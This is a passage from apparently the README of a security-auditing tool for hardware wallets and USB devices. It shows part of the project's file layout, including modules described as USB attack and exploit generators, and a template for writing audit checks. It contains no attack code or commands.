│       ├── usb_attack.py                # USB attack surface (HID, gadget, Ducky)
│       ├── usb_proxy.py                 # USB MitM APDU proxy + rule engine
│       ├── blockchain_osint.py          # Blockchain OSINT + clustering + exchange tags
│       ├── poc_generator.py             # Standalone PoC exploit generator
│       ├── _http.py                     # Robust HTTP client (retries, rate limiting)
│       ├── _keccak.py                   # Pure-Python Keccak-256 (Ethereum compat)
│       └── _logging.py                  # Exploit module logging base class
├── modules/
│   ├── wallets/ledger.py                # 39 checks
│   ├── wallets/trezor.py                # 43 checks
│   ├── mobile/android.py                # 30 checks
│   └── usb/generic.py                   # 14 checks
├── reporters/
│   ├── terminal_reporter.py
│   ├── json_reporter.py
│   ├── html_reporter.py
│   └── pdf_reporter.py              # PDF report (requires reportlab)
├── requirements.txt
└── setup.py
```

---

## Add a Module

```python
class Auditor:
    def __init__(self, device, console, verbose=False, quick=False): ...

    def get_checks(self):
        return [{"name": "My Check", "category": "security", "fn": self.my_check}]

    def my_check(self):
        return {
            "status": "PASS",  # PASS|FAIL|WARN|SKIP|ERROR|INFO
            "vulnerabilities": [{"severity": "HIGH", "title": "...",
                                  "description": "...", "remediation": "..."}],
            "info": {"key": "value"},
        }
```

Register VID/PID in `core/device_detector.py` and `core/module_registry.py`.
